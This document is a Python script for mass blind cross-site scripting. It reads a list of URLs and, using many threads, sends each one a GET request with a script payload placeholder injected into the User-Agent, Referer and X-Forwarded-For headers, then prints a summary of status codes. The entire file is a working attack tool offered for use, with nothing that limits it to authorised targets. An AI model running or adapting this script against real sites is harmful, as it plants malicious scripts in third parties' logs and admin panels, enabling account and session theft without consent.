import requests
import threading
import os
from collections import defaultdict

# BXSS Payload
BXSS_PAYLOAD = "{{bxsspayload_update}}"

# Dictionary to store response counts
status_counts = defaultdict(int)
total_urls = 0

# Lock for thread-safe updates
lock = threading.Lock()


# Function to send BXSS requests
def send_request(url):
    global status_counts
    headers = {
        "User-Agent": f"Mozilla/5.0 {BXSS_PAYLOAD}",
        "Referer": f"https://support.company.com/ticket/12345?msg={BXSS_PAYLOAD}",
        "X-Forwarded-For": f"192.168.1.1 {BXSS_PAYLOAD}",
    }
    try:
        response = requests.get(url, headers=headers, timeout=5)
        status_code = response.status_code

        with lock:
            status_counts[str(status_code)] += (
                1  # Store keys as strings to avoid type errors
            )

        print(f"[+] Sent BXSS to: {url} - Status: {status_code}")

    except requests.exceptions.RequestException as e:
        with lock:
            status_counts["Failed"] += 1  # Track failed attempts
        print(f"[-] Failed: {url} - Error: {str(e)}")


# Let user select the list file
file_path = input("Enter the path to your URL list file (e.g., list.txt): ")

# Check if the file exists
if not os.path.exists(file_path):
    print(f"[-] Error: File '{file_path}' not found!")
    exit()

# Read URLs from file
with open(file_path, "r") as file:
    URLS = [line.strip() for line in file if line.strip()]

# Count total URLs
total_urls = len(URLS)

# Use multi-threading for faster execution
threads = []
for url in URLS:
    thread = threading.Thread(target=send_request, args=(url,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Final summary report
print("\n[✅] BXSS Injection Completed!")
print("========== Request Summary ==========")
print(f"Total URLs Processed: {total_urls}")

# Sort and print numeric status codes first
for status in sorted(status_counts.keys(), key=lambda x: (x.isdigit(), x)):
    print(f"  {status}: {status_counts[status]} requests")

print("=====================================")
